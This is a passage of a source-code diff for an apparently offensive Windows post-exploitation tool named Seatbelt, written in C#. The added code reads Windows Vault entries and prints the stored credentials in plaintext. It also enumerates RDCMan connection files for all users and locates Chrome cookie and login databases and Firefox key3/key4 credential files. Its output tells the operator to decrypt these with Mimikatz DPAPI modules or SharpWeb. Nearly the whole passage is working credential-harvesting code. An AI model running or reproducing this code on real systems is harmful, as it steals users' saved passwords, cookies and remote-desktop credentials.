+                Console.WriteLine("  [X] Exception: {0}", ex.Message);
+            }
+        }
+
+        public static void ListRDCManFiles()
+        {
+            // lists any found files in Local\Microsoft\Credentials\*
+            try
+            {
+                if (IsHighIntegrity())
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for RDCMan Settings Files (All Users) ===\r\n");
+
+                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
+                    string[] dirs = Directory.GetDirectories(userFolder);
+                    bool found = false;
+
+                    foreach (string dir in dirs)
+                    {
+                        string[] parts = dir.Split('\\');
+                        string userName = parts[parts.Length - 1];
+                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
+                        {
+                            string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", dir);
+                            if (System.IO.File.Exists(userRDManFile))
+                            {
+                                XmlDocument xmlDoc = new XmlDocument();
+                                xmlDoc.Load(userRDManFile);
+
+                                // grab the recent RDG files
+                                XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
+                                XmlNodeList items = filesToOpen[0].ChildNodes;
+                                XmlNode node = items[0];
+
+                                DateTime lastAccessed = System.IO.File.GetLastAccessTime(userRDManFile);
+                                DateTime lastModified = System.IO.File.GetLastWriteTime(userRDManFile);
+                                Console.WriteLine("    RDCManFile   : {0}", userRDManFile);
+                                Console.WriteLine("    Accessed     : {0}", lastAccessed);
+                                Console.WriteLine("    Modified     : {0}", lastModified);
+
+                                foreach (XmlNode rdgFile in items)
+                                {
+                                    found = true;
+                                    Console.WriteLine("      .RDG File  : {0}", rdgFile.InnerText);
+                                }
+                                Console.WriteLine();
+                            }
+                        }
+                    }
+
+                    if (found)
+                    {
+                        Console.WriteLine("  [*] Use the Mimikatz \"dpapi::rdg\" module with appropriate /masterkey to decrypt any .rdg files");
+                        Console.WriteLine("  [*] You can extract many DPAPI masterkeys from memory with the Mimikatz \"sekurlsa::dpapi\" module");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("\r\n\r\n=== Checking for RDCMan Settings Files (Current User) ===\r\n");
+                    bool found = false;
+                    string userName = Environment.GetEnvironmentVariable("USERNAME");
+                    string userRDManFile = String.Format("{0}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+
+                    if (System.IO.File.Exists(userRDManFile))
+                    {
+                        XmlDocument xmlDoc = new XmlDocument();
+                        xmlDoc.Load(userRDManFile);
+
+                        // grab the recent RDG files
+                        XmlNodeList filesToOpen = xmlDoc.GetElementsByTagName("FilesToOpen");
+                        XmlNodeList items = filesToOpen[0].ChildNodes;
+                        XmlNode node = items[0];
+
+                        DateTime lastAccessed = System.IO.File.GetLastAccessTime(userRDManFile);
+                        DateTime lastModified = System.IO.File.GetLastWriteTime(userRDManFile);
+                        Console.WriteLine("    RDCManFile   : {0}", userRDManFile);
+                        Console.WriteLine("    Accessed     : {0}", lastAccessed);
+                        Console.WriteLine("    Modified     : {0}", lastModified);
+
+                        foreach (XmlNode rdgFile in items)
+                        {
+                            found = true;
+                            Console.WriteLine("      .RDG File  : {0}", rdgFile.InnerText);
+                        }
+                        Console.WriteLine();
+                    }
+                    if (found)
+                    {
+                        Console.WriteLine("  [*] Use the Mimikatz \"dpapi::rdg\" module with appropriate /masterkey to decrypt any .rdg files");
+                        Console.WriteLine("  [*] You can extract many DPAPI masterkeys from memory with the Mimikatz \"sekurlsa::dpapi\" module");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("  [X] Exception: {0}", ex.Message);
             }
         }
 
@@ -4794,13 +5379,13 @@ namespace Seatbelt
             {
                 // Shell.Application COM GUID
                 Type shell = Type.GetTypeFromCLSID(new Guid("13709620-C279-11CE-A49E-444553540000"));
-                
+
                 // actually instantiate the Shell.Application COM object
                 Object shellObj = Activator.CreateInstance(shell);
-                
+
                 // grab all the current windows
                 Object windows = shellObj.GetType().InvokeMember("Windows", BindingFlags.InvokeMethod, null, shellObj, null);
-                
+
                 // grab the open tab count
                 Object openTabs = windows.GetType().InvokeMember("Count", BindingFlags.GetProperty, null, windows, null);
                 int openTabsCount = Int32.Parse(openTabs.ToString());
@@ -4834,211 +5419,11 @@ namespace Seatbelt
                 Marshal.ReleaseComObject(shellObj);
                 shellObj = null;
             }
-            catch(Exception ex2)
+            catch (Exception ex2)
             {
                 Console.WriteLine("  [X] Exception: {0}", ex2);
             }
         }
-
-        public static void DumpVault()
-        {
-
-            var OSVersion = Environment.OSVersion.Version;
-            var OSMajor = OSVersion.Major;
-            var OSMinor = OSVersion.Minor;
-
-            Type VAULT_ITEM;
-
-                if (OSMajor >= 6 && OSMinor >= 2)
-                {
-                    VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);
-                }
-                else
-                {
-                    VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);
-                }
-
-            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
-            object GetVaultElementValue(IntPtr vaultElementPtr)
-            {
-                object results;
-                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
-                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
-                var partialElementType = partialElementInfo.GetValue(partialElement);
-
-                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
-                switch ((int)partialElementType)
-                {
-                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
-                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
-                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
-                        break;
-                    case 0: // VAULT_ELEMENT_TYPE == bool
-                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
-                        results = (bool)results;
-                        break;
-                    case 1: // VAULT_ELEMENT_TYPE == Short
-                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
-                        break;
-                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
-                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
-                        break;
-                    case 3: // VAULT_ELEMENT_TYPE == Int
-                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
-                        break;
-                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
-                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
-                        break;
-                    case 5: // VAULT_ELEMENT_TYPE == Double
-                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
-                        break;
-                    case 6: // VAULT_ELEMENT_TYPE == GUID
-                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
-                        break;
-                    case 12: // VAULT_ELEMENT_TYPE == Sid
-                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
-                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
-                        results = sidObject.Value;
-                        break;
-                    default:
-                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
-                            * Lord Graeber. Thus we do not implement them. */
-                        results = null;
-                        break;
-                }
-                return results;
-            }
-            /* End helper function */
-
-            Int32 vaultCount = 0;
-            IntPtr vaultGuidPtr = IntPtr.Zero;
-            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
-
-            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);
-
-            if ((int) result != 0)
-            {
-                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
-            }
-
-            // Create dictionary to translate Guids to human readable elements
-            IntPtr guidAddress = vaultGuidPtr;
-            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
-            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
-            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
-            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
-            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
-            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
-            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
-            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
-            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
-            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
-
-            for (int i = 0; i<vaultCount; i++)
-            {
-                // Open vault block
-                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
-                Guid vaultGuid = new Guid(vaultGuidString.ToString());
-                guidAddress = (IntPtr) (guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
-                IntPtr vaultHandle = IntPtr.Zero;
-                string vaultType;
-                if (vaultSchema.ContainsKey(vaultGuid))
-                {
-                    vaultType = vaultSchema[vaultGuid];
-                }
-                else
-                {
-                    vaultType = vaultGuid.ToString();
-                }
-                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
-                if (result != 0)
-                {
-                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
-                }
-                // Vault opened successfully! Continue.
-
-                // Fetch all items within Vault
-                int vaultItemCount = 0;
-                IntPtr vaultItemPtr = IntPtr.Zero;
-                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
-                if (result != 0)
-                {
-                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
-                }
-                var structAddress = vaultItemPtr;
-                if (vaultItemCount > 0)
-                {
-                    // For each vault item...
-                    for (int j = 1; j <= vaultItemCount; j++)
-                    {
-                        // Begin fetching vault item...
-                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
-                        structAddress = (IntPtr) (structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));
-                        IntPtr passwordVaultItem = IntPtr.Zero;
-                        // Field Info retrieval
-                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
-                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
-                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
-                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
-                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
-                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
-                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
-                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);
-                        object[] vaultGetItemArgs;
-                        IntPtr pPackageSid = IntPtr.Zero;
-                        if (OSMajor >= 6 && OSMinor >= 2)
-                        {
-                            // Newer versions have package sid
-                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
-                            pPackageSid = (IntPtr) pPackageSidInfo.GetValue(currentItem);
-                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
-                        }
-                        else
-                        {
-                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
-                        }
-
-                        if (result != 0)
-                        {
-                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
-                        }
-                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
-                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
-                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
-                        // Fetch the credential from the authenticator element
-                        object cred = GetVaultElementValue(pAuthenticatorElement);
-                        object packageSid = null;
-                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)
-                        {
-                            packageSid = GetVaultElementValue(pPackageSid);
-                        }
-                        if (cred != null) // Indicates successful fetch
-                        {
-                            Console.WriteLine("=== Windows Vault Credential ===");
-                            Console.WriteLine("Vault Type   : {0}", vaultType);
-                            object resource = GetVaultElementValue(pResourceElement);
-                            if (resource != null)
-                            {
-                                Console.WriteLine("Resource     : {0}", resource);
-                            }
-                            object identity = GetVaultElementValue(pIdentityElement);
-                            if (identity != null)
-                            {
-                                Console.WriteLine("Identity     : {0}", identity);
-                            }
-                            if (packageSid != null)
-                            {
-                                Console.WriteLine("PacakgeSid  : {0}", packageSid);
-                            }
-                            Console.WriteLine("Credential   : {0}", cred);
-                            // Stupid datetime
-                            Console.WriteLine("LastModified : {0}", System.DateTime.FromFileTimeUtc((long) lastModified));
-                        }
-                    }
-                }
-            }
-        }
-
         public static void TriageIE()
         {
             // lists Internt explorer history (last 7 days by default) and favorites
@@ -5179,6 +5564,216 @@ namespace Seatbelt
             }
         }
 
+        
+        public static object GetVaultElementValue(IntPtr vaultElementPtr)
+        {
+            // Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct
+            // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
+            object results;
+            object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
+            FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
+            var partialElementType = partialElementInfo.GetValue(partialElement);
+
+            IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
+            switch ((int)partialElementType)
+            {
+                case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
+                    IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
+                    results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
+                    break;
+                case 0: // VAULT_ELEMENT_TYPE == bool
+                    results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
+                    results = (bool)results;
+                    break;
+                case 1: // VAULT_ELEMENT_TYPE == Short
+                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
+                    break;
+                case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
+                    results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
+                    break;
+                case 3: // VAULT_ELEMENT_TYPE == Int
+                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
+                    break;
+                case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
+                    results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
+                    break;
+                case 5: // VAULT_ELEMENT_TYPE == Double
+                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
+                    break;
+                case 6: // VAULT_ELEMENT_TYPE == GUID
+                    results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
+                    break;
+                case 12: // VAULT_ELEMENT_TYPE == Sid
+                    IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
+                    var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
+                    results = sidObject.Value;
+                    break;
+                default:
+                    /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
+                     * Lord Graeber. Thus we do not implement them. */
+                    results = null;
+                    break;
+            }
+            return results;
+        }
+        public static void DumpVault()
+        {
+            // pulled directly from @djhohnstein's SharpWeb project: https://github.com/djhohnstein/SharpWeb/blob/master/Edge/SharpEdge.cs
+            Console.WriteLine("\r\n\r\n=== Checking Windows Vaults ===");
+            var OSVersion = Environment.OSVersion.Version;
+            var OSMajor = OSVersion.Major;
+            var OSMinor = OSVersion.Minor;
+
+            Type VAULT_ITEM;
+
+            if (OSMajor >= 6 && OSMinor >= 2)
+            {
+                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN8);
+            }
+            else
+            {
+                VAULT_ITEM = typeof(VaultCli.VAULT_ITEM_WIN7);
+            }
+
+            Int32 vaultCount = 0;
+            IntPtr vaultGuidPtr = IntPtr.Zero;
+            var result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);
+
+            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);
+
+            if ((int)result != 0)
+            {
+                Console.WriteLine("  [ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
+                return;
+            }
+
+            // Create dictionary to translate Guids to human readable elements
+            IntPtr guidAddress = vaultGuidPtr;
+            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
+            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
+            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
+            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
+            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
+            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
+            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
+            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
+            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
+            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);
+
+            for (int i = 0; i < vaultCount; i++)
+            {
+                // Open vault block
+                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
+                Guid vaultGuid = new Guid(vaultGuidString.ToString());
+                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
+                IntPtr vaultHandle = IntPtr.Zero;
+                string vaultType;
+                if (vaultSchema.ContainsKey(vaultGuid))
+                {
+                    vaultType = vaultSchema[vaultGuid];
+                }
+                else
+                {
+                    vaultType = vaultGuid.ToString();
+                }
+                result = VaultCli.VaultOpenVault(ref vaultGuid, (UInt32)0, ref vaultHandle);
+                if (result != 0)
+                {
+                    Console.WriteLine("  [ERROR] Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
+                    return;
+                }
+                // Vault opened successfully! Continue.
+
+
+                Console.WriteLine("\r\n  Vault GUID     : {0}", vaultGuid);
+                Console.WriteLine("  Vault Type     : {0}\r\n", vaultType);
+
+                // Fetch all items within Vault
+                int vaultItemCount = 0;
+                IntPtr vaultItemPtr = IntPtr.Zero;
+                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
+                if (result != 0)
+                {
+                    Console.WriteLine("  [ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
+                    return;
+                }
+                var structAddress = vaultItemPtr;
+                if (vaultItemCount > 0)
+                {
+                    // For each vault item...
+                    for (int j = 1; j <= vaultItemCount; j++)
+                    {
+                        // Begin fetching vault item...
+                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
+                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));
+
+                        IntPtr passwordVaultItem = IntPtr.Zero;
+                        // Field Info retrieval
+                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
+                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
+                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
+                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
+                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
+                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
+                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
+                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);
+
+                        IntPtr pPackageSid = IntPtr.Zero;
+                        if (OSMajor >= 6 && OSMinor >= 2)
+                        {
+                            // Newer versions have package sid
+                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
+                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
+                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
+                        }
+                        else
+                        {
+                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
+                        }
+
+                        if (result != 0)
+                        {
+                            Console.WriteLine("  [ERROR] occured while retrieving vault item. Error: 0x" + result.ToString());
+                            return;
+                        }
+                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
+                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
+                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
+                        // Fetch the credential from the authenticator element
+                        object cred = GetVaultElementValue(pAuthenticatorElement);
+                        object packageSid = null;
+                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)
+                        {
+                            packageSid = GetVaultElementValue(pPackageSid);
+                        }
+                        if (cred != null) // Indicates successful fetch
+                        {
+                            // Console.WriteLine("  --- IE/Edge Credential ---");
+                            // Console.WriteLine("  Vault Type   : {0}", vaultType);
+                            object resource = GetVaultElementValue(pResourceElement);
+                            if (resource != null)
+                            {
+                                Console.WriteLine("    Resource     : {0}", resource);
+                            }
+                            object identity = GetVaultElementValue(pIdentityElement);
+                            if (identity != null)
+                            {
+                                Console.WriteLine("    Identity     : {0}", identity);
+                            }
+                            if (packageSid != null)
+                            {
+                                Console.WriteLine("    PacakgeSid  : {0}", packageSid);
+                            }
+                            Console.WriteLine("    Credential   : {0}", cred);
+                            // Stupid datetime
+                            Console.WriteLine("    LastModified : {0}", System.DateTime.FromFileTimeUtc((long)lastModified));
+                            Console.WriteLine();
+                        }
+                    }
+                }
+            }
+        }
+
         public static void CheckChrome()
         {
             // checks if Chrome has a history database
@@ -5192,6 +5787,7 @@ namespace Seatbelt
                     string[] dirs = Directory.GetDirectories(userFolder);
                     foreach (string dir in dirs)
                     {
+                        bool found = false;
                         string[] parts = dir.Split('\\');
                         string userName = parts[parts.Length - 1];
                         if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
@@ -5199,7 +5795,27 @@ namespace Seatbelt
                             string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", dir);
                             if (System.IO.File.Exists(userChromeHistoryPath))
                             {
-                                Console.WriteLine("  [*] Chrome history file exists at {0} , run the 'TriageChrome' command", userChromeHistoryPath);
+                                Console.WriteLine("  [*] Chrome history file exists at {0}", userChromeHistoryPath);
+                                Console.WriteLine("      Run the 'TriageChrome' command\r\n");
+                                found = true;
+                            }
+                            string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
+                            if (System.IO.File.Exists(userChromeCookiesPath))
+                            {
+                                Console.WriteLine("  [*] Chrome cookies database exists at {0}", userChromeCookiesPath);
+                                Console.WriteLine("      Run the Mimikatz \"dpapi::chrome\" module\r\n");
+                                found = true;
+                            }
+                            string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", dir);
+                            if (System.IO.File.Exists(userChromeLoginDataPath))
+                            {
+                                Console.WriteLine("  [*] Chrome saved login database exists at {0}", userChromeLoginDataPath);
+                                Console.WriteLine("      Run the Mimikatz \"dpapi::chrome\" module or SharpWeb (https://github.com/djhohnstein/SharpWeb)\r\n");
+                                found = true;
+                            }
+                            if (found)
+                            {
+                                Console.WriteLine();
                             }
                         }
                     }
@@ -5210,7 +5826,20 @@ namespace Seatbelt
                     string userChromeHistoryPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", System.Environment.GetEnvironmentVariable("USERPROFILE"));
                     if (System.IO.File.Exists(userChromeHistoryPath))
                     {
-                        Console.WriteLine("  [*] Chrome history file exists at {0} , run the 'TriageChrome' command", userChromeHistoryPath);
+                        Console.WriteLine("  [*] Chrome history file exists at {0}", userChromeHistoryPath);
+                        Console.WriteLine("      Run the 'TriageChrome' command\r\n");
+                    }
+                    string userChromeCookiesPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(userChromeCookiesPath))
+                    {
+                        Console.WriteLine("  [*] Chrome cookies database exists at {0}", userChromeCookiesPath);
+                        Console.WriteLine("      Run the Mimikatz \"dpapi::chrome\" module\r\n");
+                    }
+                    string userChromeLoginDataPath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", System.Environment.GetEnvironmentVariable("USERPROFILE"));
+                    if (System.IO.File.Exists(userChromeLoginDataPath))
+                    {
+                        Console.WriteLine("  [*] Chrome saved login database exists at {0}", userChromeLoginDataPath);
+                        Console.WriteLine("      Run the Mimikatz \"dpapi::chrome\" module or SharpWeb (https://github.com/djhohnstein/SharpWeb)");
                     }
                 }
             }
@@ -5345,6 +5974,7 @@ namespace Seatbelt
                         string userName = parts[parts.Length - 1];
                         if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                         {
+                            bool found = false;
                             string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", dir);
                             if (System.IO.Directory.Exists(userFirefoxBasePath))
                             {
@@ -5354,8 +5984,28 @@ namespace Seatbelt
                                     string firefoxHistoryFile = String.Format("{0}\\{1}", directory, "places.sqlite");
                                     if (System.IO.File.Exists(firefoxHistoryFile))
                                     {
-                                        Console.WriteLine("  [*] Firefox history file exists at {0} , run the 'TriageFirefox' command", firefoxHistoryFile);
+                                        Console.WriteLine("  [*] Firefox history file exists at {0}", firefoxHistoryFile);
+                                        Console.WriteLine("      Run the 'TriageFirefox' command\r\n");
+                                        found = true;
                                     }
+                                    string firefoxCredentialFile3 = String.Format("{0}\\{1}", directory, "key3.db");
+                                    if (System.IO.File.Exists(firefoxCredentialFile3))
+                                    {
+                                        Console.WriteLine("  [*] Firefox credential file exists at {0}", firefoxCredentialFile3);
+                                        Console.WriteLine("      Run SharpWeb (https://github.com/djhohnstein/SharpWeb) \r\n");
+                                        found = true;
+                                    }
+                                    string firefoxCredentialFile4 = String.Format("{0}\\{1}", directory, "key4.db");
+                                    if (System.IO.File.Exists(firefoxCredentialFile4))
+                                    {
+                                        Console.WriteLine("  [*] Firefox credential file exists at {0}", firefoxCredentialFile4);
+                                        Console.WriteLine("      Run SharpWeb (https://github.com/djhohnstein/SharpWeb) \r\n");
+                                        found = true;
+                                    }
+                                }
+                                if (found)
+                                {
+                                    Console.WriteLine();
                                 }
                             }
                         }
@@ -5375,13 +6025,26 @@ namespace Seatbelt
                             string firefoxHistoryFile = String.Format("{0}\\{1}", directory, "places.sqlite");
                             if (System.IO.File.Exists(firefoxHistoryFile))
                             {
-                                Console.WriteLine("  [*] Firefox history file exists at {0} , run the 'TriageFirefox' command", firefoxHistoryFile);
+                                Console.WriteLine("  [*] Firefox history file exists at {0}", firefoxHistoryFile);
+                                Console.WriteLine("      Run the 'TriageFirefox' command\r\n");
+                            }
+                            string firefoxCredentialFile3 = String.Format("{0}\\{1}", directory, "key3.db");
+                            if (System.IO.File.Exists(firefoxCredentialFile3))
+                            {
+                                Console.WriteLine("  [*] Firefox credential file exists at {0}", firefoxCredentialFile3);
+                                Console.WriteLine("      Run SharpWeb (https://github.com/djhohnstein/SharpWeb)\r\n");
+                            }
+                            string firefoxCredentialFile4 = String.Format("{0}\\{1}", directory, "key4.db");
+                            if (System.IO.File.Exists(firefoxCredentialFile4))
+                            {
+                                Console.WriteLine("  [*] Firefox credential file exists at {0}", firefoxCredentialFile4);
+                                Console.WriteLine("      Run SharpWeb (https://github.com/djhohnstein/SharpWeb)\r\n");
                             }
                         }
                     }
                 }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 Console.WriteLine("  [X] Exception: {0}", ex.Message);
             }
@@ -5466,7 +6129,7 @@ namespace Seatbelt
             // lists recently run commands via the RunMRU registry key
             if (IsHighIntegrity())
             {
-                Console.WriteLine("\r\n\r\n=== Recent Typed RUN Commands (All Users) ===\r\n");
+                Console.WriteLine("\r\n\r\n=== Recent Typed RUN Commands (All Users) ===");
 
                 string[] SIDs = Registry.Users.GetSubKeyNames();
                 foreach (string SID in SIDs)
@@ -5476,7 +6139,7 @@ namespace Seatbelt
